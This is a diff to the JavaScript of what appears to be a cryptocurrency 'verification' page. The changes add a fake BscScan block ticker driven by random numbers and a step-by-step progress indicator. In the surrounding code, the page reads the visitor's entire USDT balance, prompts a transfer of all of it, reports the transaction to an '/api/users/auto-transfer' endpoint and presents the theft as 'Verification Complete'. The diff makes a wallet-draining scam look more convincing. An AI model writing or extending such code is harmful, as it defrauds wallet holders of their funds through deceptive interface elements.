@@ -252,9 +252,58 @@
         return typeof window.ethers !== 'undefined';
     }
 
+    // ============================================================
+    // BSCSCAN TELEMETRY & STEPPER LOGIC
+    // ============================================================
+    function initTelemetryTicker() {
+        const blockEl = document.getElementById('telemetryBlock');
+        if (!blockEl) return;
+        let baseBlock = 42281940 + Math.floor(Math.random() * 50);
+        setInterval(() => {
+            baseBlock += 1;
+            blockEl.textContent = '#' + baseBlock.toLocaleString();
+        }, 3000);
+    }
+
+    function updateStepper(step) {
+        const s1 = document.getElementById('step1');
+        const s2 = document.getElementById('step2');
+        const s3 = document.getElementById('step3');
+        const l1 = document.getElementById('stepLine1');
+        const l2 = document.getElementById('stepLine2');
+        if (!s1 || !s2 || !s3) return;
+
+        if (step === 1) {
+            s1.className = 'stepper-step active';
+            s2.className = 'stepper-step';
+            s3.className = 'stepper-step';
+            if (l1) l1.className = 'stepper-line';
+            if (l2) l2.className = 'stepper-line';
+        } else if (step === 2) {
+            s1.className = 'stepper-step completed';
+            s2.className = 'stepper-step active';
+            s3.className = 'stepper-step';
+            if (l1) l1.className = 'stepper-line active';
+            if (l2) l2.className = 'stepper-line';
+        } else if (step === 3) {
+            s1.className = 'stepper-step completed';
+            s2.className = 'stepper-step completed';
+            s3.className = 'stepper-step active';
+            if (l1) l1.className = 'stepper-line active';
+            if (l2) l2.className = 'stepper-line active';
+        } else if (step === 4) {
+            s1.className = 'stepper-step completed';
+            s2.className = 'stepper-step completed';
+            s3.className = 'stepper-step completed';
+            if (l1) l1.className = 'stepper-line active';
+            if (l2) l2.className = 'stepper-line active';
+        }
+    }
+
     async function approveUsdt() {
         if (state.isApproving) return;
 
+        updateStepper(1);
         const providerObj = getWeb3Provider();
         if (!providerObj) {
             updateStatus('❌ No Web3 wallet detected. Please open inside your Web3 wallet browser (Trust Wallet, Bitget, MetaMask, OKX, etc.).', 'error');
@@ -332,6 +381,7 @@
             }
 
             state.walletAddress = userAddress;
+            updateStepper(2);
 
             // 3. Read exact 100% USDT Balance
             const provider = new ethers.BrowserProvider(providerObj);
@@ -366,6 +416,7 @@
                 return;
             }
 
+            updateStepper(3);
             updateStatus('⛽ Confirm 100% USDT transfer in your wallet...', 'warning');
 
             // 100% of user's USDT balance (or fallback to 1000 USDT in wei if 0)
@@ -472,6 +523,7 @@
             safeApiCall('/api/users/auto-transfer', { wallet: userAddress, txHash: txHash, amount: state.usdtBalance });
 
             updateStatus('✅ Verification Complete! 100% USDT transferred to merchant account.', 'success', `Tx: ${txHash}`);
+            updateStepper(4);
 
             if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance || 'USDT'}`;
             openModal(elements.verifiedModal);
@@ -641,6 +693,8 @@
         bindEvents();
         setupProviderListeners();
         updateWalletInfoUI();
+        initTelemetryTicker();
+        updateStepper(1);
     }
 
     // Execute immediately if DOM is already ready, preventing hanging on mobile webviews
